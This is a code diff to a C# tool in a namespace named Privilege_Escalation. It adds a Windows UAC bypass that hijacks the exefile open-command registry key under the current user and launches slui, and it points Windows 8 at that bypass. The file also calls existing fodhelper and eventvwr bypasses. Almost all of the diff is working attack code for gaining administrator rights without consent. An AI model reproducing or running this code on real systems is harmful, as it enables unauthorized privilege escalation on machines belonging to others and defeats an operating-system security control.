@@ -23,7 +23,7 @@ namespace Privilege_Escalation
                 if (osName.StartsWith("Windows 10"))
                     BypassFodhelper();
                 else if (osName.StartsWith("Windows 8"))
-                    BypassEventvwr();
+                    BypassSlui();
                 else if (osName.StartsWith("Windows 7"))
                     BypassEventvwr();
                 else
@@ -53,6 +53,30 @@ namespace Privilege_Escalation
             try
             {
                 Process.Start("fodhelper");
+            }
+            catch
+            {
+                Console.WriteLine("Please make sure you removed prefer 32-bits.");
+            }
+            finally
+            {
+                Wow64Interop.Wow64RevertWow64FsRedirection(wow64Value);
+                Environment.Exit(0);
+            }
+        }
+
+        private static void BypassSlui()
+        {
+            var wow64Value = IntPtr.Zero;
+            Registry.CurrentUser.CreateSubKey(@"Software\Classes\exefile\shell\open\command");
+            Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command", true)
+                ?.SetValue("", Assembly.GetExecutingAssembly().Location);
+            Registry.CurrentUser.OpenSubKey(@"Software\Classes\exefile\shell\open\command", true)
+                ?.SetValue("DelegateExecute", "");
+            Wow64Interop.DisableWow64FSRedirection(ref wow64Value);
+            try
+            {
+                Process.Start("slui");
             }
             catch
             {
